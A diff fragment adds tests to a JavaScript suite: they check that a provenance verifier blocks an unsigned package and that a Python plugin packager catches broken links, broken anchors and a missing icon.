+      assert.equal(strictHead.recommended_action, "BLOCK_NO_SAFE_PATH");
+      assert.equal(strictHead.safe_anchor?.pinned_execution.command, null);
+      assert.ok(strictHead.unknowns.some((u) => u.startsWith("PROVENANCE_REQUIRED_NOT_VERIFIED")));
+      const anchorMd = formatAnchorMarkdown(strictHead);
+      assert.ok(anchorMd.includes("dsse_leaf_verified_unanchored") && anchorMd.includes("sigstore_verified=`false`"));
+    } finally {
+      rmSync(tmpRepo, { recursive: true, force: true });
+    }
+
+    // 5. Negative packager validation test: pack_plugin.py validate_archive_contents MUST catch broken relative links, broken #anchors, and missing openai.yaml icon
+    const negOut = execFileSync(
+      "python",
+      [
+        "-B",
+        "-c",
+        [
+          "import sys; sys.path.insert(0, 'scripts'); import pack_plugin as pp",
+          "items = pp.collect_target_files('openai')",
+          "fb = {arc: pp.render_archive_bytes(arc, p) for arc, p in items}",
+          "assert pp.validate_archive_contents('openai', fb) == []",
+          "fb_link = dict(fb); fb_link['docs/designs/SITEMAP.md'] = b'[broken](nope.md)\\n'",
+          "e1 = pp.validate_archive_contents('openai', fb_link); assert any('broken packaged relative link' in e for e in e1)",
+          "fb_anc = dict(fb); fb_anc['README.md'] = fb['README.md'] + b'\\n[bad](#does-not-exist)\\n'",
+          "e2 = pp.validate_archive_contents('openai', fb_anc); assert any('broken packaged in-page anchor' in e for e in e2)",
+          "fb_oy = dict(fb); fb_oy['skills/coldpin/agents/openai.yaml'] = b'icon_small: ./assets/missing.svg\\n'",
+          "e3 = pp.validate_archive_contents('openai', fb_oy); assert any('missing icon' in e for e in e3)",
+          "print('NEGATIVE_PACK_OK')",
+        ].join("; "),
+      ],
+      { encoding: "utf8" },
+    );
+    assert.ok(negOut.includes("NEGATIVE_PACK_OK"));
   });
 });
